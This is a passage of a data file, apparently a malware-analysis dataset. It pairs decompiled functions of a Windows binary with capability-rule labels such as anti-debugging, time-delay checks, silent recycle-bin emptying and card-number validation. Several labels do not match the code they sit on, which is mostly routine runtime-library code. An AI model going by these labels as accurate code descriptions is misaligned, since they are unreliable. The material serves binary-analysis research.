0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x418db0 == (param_1 & *0x418d40 | *0x418db0)) {\n                    return *0x418de8;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x418d40;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x004118ba;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x418dd0);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x418de0;\ncode_r0x004118ba:\n    fcn.00411f03(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1006
    },
    "00401404": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401404(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *arg_ch;\n    iVar3 = arg_ch[1];\n    uVar6 = arg_8h[1];\n    iVar4 = arg_ch[2];\n    iVar5 = arg_ch[3];\n    uVar8 = *arg_8h;\n    iVar7 = -0x3910c8e0;\n    arg_ch = 0x20;\n    do {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        uVar6 = uVar6 - ((uVar8 >> 5) + iVar5 ^ uVar8 * 0x10 + iVar4 ^ iVar7 + uVar8);\n        uVar1 = iVar7 + uVar6;\n        iVar7 = iVar7 + 0x61c88647;\n        uVar8 = uVar8 - ((uVar6 >> 5) + iVar3 ^ uVar6 * 0x10 + iVar2 ^ uVar1);\n        arg_ch = arg_ch + -1;\n    } while (arg_ch != NULL);\n    *arg_8h = uVar8;\n    arg_8h[1] = uVar6;\n    return;\n}\n",
        "token_count": 387
    },
    "00406ea5": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406ea5(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00406ce7(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "0040149c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040149c(int32_t arg_8h, uint32_t *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    \n    for (uVar1 = *arg_ch >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        fcn.00401404(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0040ba30": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba30(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    arg_8h_00 = fcn.0040ab69(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.00409b44();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                arg_ch[2] = 0;\n                if ((arg_ch[3] >> 3 & 1) == 0) goto code_r0x0040b87d;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) &&\n               (((puVar2 = fcn.0040ac57(1),  arg_ch != puVar2 && (puVar2 = fcn.0040ac57(2),  arg_ch != puVar2)) ||\n                (iVar3 = fcn.00410219(arg_8h_00),  iVar3 == 0)))) {\n                fcn.0041046d(arg_ch);\n            }\n            cVar1 = fcn.0040b964(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                return 0xffffffff;\n            }\n            return arg_8h & 0xff;\n        }\n        puVar2 = fcn.00409b44();\n        *puVar2 = 0x22;\n    }\ncode_r0x0040b87d:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 526
    },
    "0040159f": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0040159f(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *extraout_ECX;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t unaff_EBP;\n    uint unaff_EDI;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00401c14();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar6 = *(unaff_EBP + 8) | 0xf;\n    if (uVar6 == 0xffffffff) {\n        uVar6 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar1 = extraout_ECX[5];\n        uVar4 = uVar1 >> 1;\n        *(unaff_EBP + -0x1c) = 3;\n        if (uVar6 / *(unaff_EBP + -0x1c) < uVar4) {\n            if (-uVar4 - 2 < uVar1) {\n                uVar6 = 0xfffffffe;\n            }\n            else {\n                uVar6 = uVar4 + uVar1;\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401523(uVar6 + 1, 1, 1, unaff_EDI);\n    *(unaff_EBP + -0x14) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 != 0) {\n        puVar5 = extraout_ECX;\n        if (0xf < extraout_ECX[5]) {\n            puVar5 = *extraout_ECX;\n        }\n        if (iVar2 != 0) {\n            fcn.004031d0(uVar3, puVar5, iVar2);\n        }\n    }\n    fcn.0040179d(1, 0);\n    if (extraout_ECX != NULL) {\n        *extraout_ECX = *(unaff_EBP + -0x14);\n    }\n    extraout_ECX[5] = uVar6;\n    extraout_ECX[4] = iVar2;\n    puVar5 = extraout_ECX;\n    if (0xf < extraout_ECX[5]) {\n        puVar5 = *extraout_ECX;\n    }\n    *(puVar5 + iVar2) = 0;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 703
    },
    "0040b55c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b55c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004024d0(0x41a470, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.00409b31();\n        *puVar1 = 0;\n        puVar1 = fcn.00409b44();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x41df68)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x30;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x41dd68) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040d0d7(lpCriticalSection);\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x41dd68) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.00409b44();\n                    *puVar1 = 9;\n                    puVar1 = fcn.00409b31();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.0040b647(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040b61e();\n                goto code_r0x0040b641;\n            }\n        }\n        puVar1 = fcn.00409b31();\n        *puVar1 = 0;\n        puVar1 = fcn.00409b44();\n        *puVar1 = 9;\n        fcn.004051ed();\n    }\ncode_r0x0040b641:\n    fcn.00402516();\n    return;\n}\n",
        "token_count": 609
    },
    "004104ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004104ca(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    uint uVar4;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.004024d0();\n    uVar4 = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040d0d7(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x41dd68) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) != 0) {\n        uVar1 = fcn.0040d1ae(arg_8h_00);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        if (iVar2 != 0) goto code_r0x0041053a;\n        puVar3 = fcn.00409b31();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *puVar3 = uVar4;\n    }\n    puVar3 = fcn.00409b44();\n    *puVar3 = 9;\n    uVar4 = 0xffffffff;\ncode_r0x0041053a:\n    *(unaff_EBP + -0x1c) = uVar4;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00410556(0x41a5b8, noname_1, unaff_retaddr);\n    fcn.00402516();\n    return;\n}\n",
        "token_count": 483
    },
    "004121d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004121d4(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.004024d0();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040d0d7(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x41dd68) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) == 0) {\n        puVar2 = fcn.00409b44();\n        *puVar2 = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.004122fd(arg_8h_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041224a(0x41a618, noname_1, unaff_retaddr);\n    fcn.00402516();\n    return;\n}\n",
        "token_count": 377
    },
    "0041227e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041227e(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_4h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.00409b31();\n        *puVar1 = 0;\n        puVar1 = fcn.00409b44();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x41df68)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x41dd68) + 0x28 + (arg_8h & 0x3f) * 0x30) & 1) != 0)) {\n            var_4h = &arg_8h;\n            uVar2 = fcn.00412256(arg_8h, &var_4h);\n            return uVar2;\n        }\n        puVar1 = fcn.00409b31();\n        *puVar1 = 0;\n        puVar1 = fcn.00409b44();\n        *puVar1 = 9;\n        fcn.004051ed();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 290
    },
    "0040252b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040256c)\n// WARNING: Removing unreachable block (ram,0x0040261c)\n// WARNING: Removing unreachable block (ram,0x004025a6)\n\nuint fcn.0040252b(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x41d704 = 0;\n    *0x41c020 = *0x41c020 | 1;\n    iVar4 = sub.KERNEL32.dll_IsProcessorFeaturePresent(10);\n    uVar3 = *0x41c020;\n    if (iVar4 != 0) {\n        var_10h = 0;\n        *0x41c020 = *0x41c020 | 2;\n        *0x41d704 = 1;\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar6 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar5 = *puVar2 & 0xfff3ff0,  uVar5 == 0x106c0 || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n             ((uVar5 == 0x30650 || (uVar5 == 0x30660)))) || (uVar5 == 0x30670)))) {\n            *0x41d708 = *0x41d708 | 1;\n        }\n        if (6 < *piVar1) {\n            iVar4 = cpuid_Extended_Feature_Enumeration_info(7);\n            var_10h = *(iVar4 + 4);\n            if ((var_10h & 0x200) != 0) {\n                *0x41d708 = *0x41d708 | 2;\n            }\n        }\n        if ((uVar6 & 0x100000) != 0) {\n            *0x41c020 = uVar3 | 6;\n            *0x41d704 = 2;\n            if ((((uVar6 & 0x8000000) != 0) && ((uVar6 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x41c020 = uVar3 | 0xe;\n                *0x41d704 = 3;\n                if ((var_10h & 0x20) != 0) {\n                    *0x41c020 = uVar3 | 0x2e;\n                    *0x41d704 = 5;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 759
    },
    "00406f4f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406f4f(uint *param_1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    iVar1 = *(param_1[5] + -4);\n    param_1[0xd] = iVar1;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0040564e(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar2 == '\\0') {\n        if (iVar1 == 0) {\n            param_1[0xd] = 0x414d1c;\n        }\n        uVar3 = fcn.00406fc3(arg_8h);\n    }\n    else {\n        if (iVar1 == 0) {\n            param_1[0xd] = L\"(null)\";\n        }\n        *(param_1 + 0xf) = 1;\n        uVar3 = fcn.00409f43(param_1[0xd], arg_8h);\n    }\n    param_1[0xe] = uVar3;\n    return 1;\n}\n",
        "token_count": 317
    },
    "0040bd9a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bd9a(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0040bcef:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    iVar4 = arg_ch;\n                    piVar5 = arg_8h;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar5);\n                            *piVar5 = iVar1;\n                            piVar5 = piVar5 + 1;\n                            if (iVar1 == 0) break;\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar5);\n                            *piVar5 = iVar1;\n                            piVar5 = piVar5 + 1;\n                            if ((iVar1 == 0) || (iVar4 = iVar4 + -1,  iVar4 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar5 = 0;\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.00409b44();\n                    uVar6 = 0x22;\n                    goto code_r0x0040bd14;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0040bcef;\n    puVar2 = fcn.00409b44();\n    uVar6 = 0x16;\ncode_r0x0040bd14:\n    *puVar2 = uVar6;\n    fcn.004051ed();\n    return uVar6;\n}\n",
        "token_count": 620
    },
    "0040c2bf": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c2bf(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int16_t **ppiVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int16_t **ppiVar9;\n    uint32_t uVar10;\n    int16_t **ppiVar11;\n    int32_t var_30h;\n    uint var_2ch;\n    int16_t **var_28h;\n    int16_t **var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    ushort var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c028 ^ &stack0xfffffffc;\n    if (arg_ch == NULL) {\n        puVar5 = fcn.00409b44();\n        *puVar5 = 0x16;\n        fcn.004051ed();\n    }\n    else {\n        *arg_ch = 0;\n        var_1ch = 0;\n        var_28h = NULL;\n        var_24h = NULL;\n        var_20h = 0;\n        iVar6 = *arg_8h;\n        ppiVar11 = var_28h;\n        ppiVar4 = var_24h;\n        while (var_28h = ppiVar11,  var_24h = ppiVar4,  iVar6 != 0) {\n            var_ch = 0x3f002a;\n            var_8h = 0;\n            iVar6 = fcn.0040d4c5(*arg_8h, &var_ch);\n            if (iVar6 == 0) {\n                iVar6 = fcn.0040bf8a(*arg_8h, 0, 0, &var_28h);\n            }\n            else {\n                iVar6 = fcn.0040c028(*arg_8h, iVar6, &var_28h);\n            }\n            if (iVar6 != 0) goto code_r0x0040bf62;\n            arg_8h = arg_8h + 1;\n            ppiVar11 = var_28h;\n            ppiVar4 = var_24h;\n            iVar6 = *arg_8h;\n        }\n        var_14h = 0;\n        var_10h = 0;\n        var_18h = (ppiVar4 - ppiVar11 >> 2) + 1;\n        uVar10 = ~-(ppiVar4 < ppiVar11) & (ppiVar4 - ppiVar11) + 3U >> 2;\n        if (uVar10 != 0) {\n            var_14h = 0;\n            ppiVar9 = ppiVar11;\n            do {\n                piVar8 = *ppiVar9;\n                piVar1 = piVar8 + 1;\n                do {\n                    iVar2 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                } while (iVar2 != var_1ch);\n                ppiVar9 = ppiVar9 + 1;\n                var_14h = var_14h + 1 + (piVar8 - piVar1 >> 1);\n                var_10h = var_10h + 1;\n            } while (var_10h != uVar10);\n        }\n        iVar6 = fcn.00407b54(var_18h, var_14h, 2);\n        if (iVar6 != 0) {\n            var_30h = iVar6 + var_18h * 4;\n            var_18h = var_30h;\n            if (ppiVar11 != ppiVar4) {\n                var_ch = iVar6 - ppiVar11;\n                do {\n                    piVar8 = *ppiVar11;\n                    piVar1 = piVar8 + 1;\n                    do {\n                        iVar2 = *piVar8;\n                        piVar8 = piVar8 + 1;\n                    } while (iVar2 != var_1ch);\n                    var_10h = (piVar8 - piVar1 >> 1) + 1;\n                    iVar7 = fcn.0040bd9a(var_18h, var_14h - (var_18h - var_30h >> 1), *ppiVar11, var_10h);\n                    if (iVar7 != 0) {\n                        fcn.0040521a(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    *(var_ch + ppiVar11) = var_18h;\n                    ppiVar11 = ppiVar11 + 1;\n                    var_18h = var_18h + var_10h * 2;\n                } while (ppiVar11 != ppiVar4);\n            }\n            *arg_ch = iVar6;\n            iVar6 = 0;\n        }\n        fcn.004088c0(iVar6);\ncode_r0x0040bf62:\n        fcn.0040c1de();\n    }\n    fcn.004026d1(var_30h);\n    return;\n}\n",
        "token_count": 1237
    },
    "0040d0d7": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d0d7(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x41dd68));\n    return;\n}\n",
        "token_count": 71
    },
    "0040d0fa": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d0fa(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x41dd68));\n    return;\n}\n",
        "token_count": 71
    },
    "0040db3b": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040db3b(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.004024d0();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040bc0a(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x41c028 & 0x1f;\n    *(unaff_EBP + -0x1c) = (*0x41c028 ^ *0x41e1d4) >> uVar1 | (*0x41c028 ^ *0x41e1d4) << 0x20 - uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040db89(0x41a558, noname_1, unaff_retaddr);\n    fcn.00402516();\n    return;\n}\n",
        "token_count": 282
    },
    "00401832": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401832(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    \n    fcn.00401585(arg_ch);\n    if (arg_8h[4] - arg_ch < arg_10h) {\n        arg_10h = arg_8h[4] - arg_ch;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00401941(arg_ch + arg_10h);\n        fcn.0040196c(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.00401702(arg_10h, 0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar2 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar2 = *in_ECX;\n            }\n            if (arg_10h != 0) {\n                fcn.004031d0(puVar2, arg_ch + arg_8h, arg_10h);\n            }\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0040196c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040196c(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    \n    fcn.00401585(arg_8h);\n    if (arg_ch < in_ECX[4] - arg_8h) {\n        if (arg_ch != 0) {\n            puVar1 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar1 = *in_ECX;\n            }\n            iVar2 = in_ECX[4] - arg_ch;\n            if (iVar2 - arg_8h != 0) {\n                fcn.00402810(puVar1 + arg_8h, puVar1 + arg_8h + arg_ch, iVar2 - arg_8h);\n            }\n            in_ECX[4] = iVar2;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + iVar2) = 0;\n        }\n    }\n    else {\n        in_ECX[4] = arg_8h;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_8h) = 0;\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "0040d627": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d627(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.004088c0(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "004014d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014d5(int32_t arg_8h, int32_t arg_ch)\n\n{\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x18) {\n        fcn.0040179d(1, 0);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00401a08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a08(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.00401a02();\n    iVar2 = fcn.004072e9(*puVar1 | 1, puVar1[1], arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 145
    },
    "00401a3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a3a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00401a08(arg_8h, 0xffffffff, arg_ch, 0, &arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00405fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405fb8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00405b64(param_1 + 0x28);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x28) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 181
    },
    "00405fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
